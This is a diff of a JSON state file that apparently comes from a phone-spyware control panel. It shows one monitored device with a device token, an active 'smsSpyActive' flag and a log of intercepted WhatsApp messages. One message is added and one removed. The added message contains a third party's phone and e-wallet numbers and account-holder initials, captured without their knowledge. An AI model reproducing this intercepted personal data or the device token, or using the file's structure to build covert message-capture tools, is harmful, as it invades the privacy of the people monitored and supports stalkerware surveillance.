@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776859265707,
+    "lastSeen": 1776859271696,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "+62 822-6965-3769",
+        "content": "📷  ⁺🍶 ׅ PAYMENT \n\"💖\" • ──── Payment Disini \nsilakan transfer sesuai nominal yang sudah diberikan (no kurang, no lebih).\n\n开. NAME QRIS ꠩ TOKO KELONTONG KYY \n开. FEE LUAR DANA ꠩ 150p\n开. FEE BANK ꠩ 500p\n\nE-wallet OVO : 082269653769 A/N k.y\nE-wallet DANA : 085191885022 A/N N.S.P\nE-wallet GOPAY : 082269653769 A/N i.k\nE-wallet SHOPEPAY : 082269653769 A/N k.y\n\nGA PAKAI FEE GA DI PROSES YOO",
+        "time": "22/04 20:01",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776859274327
+      },
       {
         "appName": "WhatsApp",
         "sender": "prily 🤍",
@@ -4011,14 +4019,6 @@
         "time": "22/04 15:13",
         "pkg": "com.whatsapp",
         "receivedAt": 1776841992789
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "7Sex Message",
-        "content": "‎39 pesan baru",
-        "time": "22/04 15:12",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776841934696
       }
     ],
     "galleryPhotos": [],
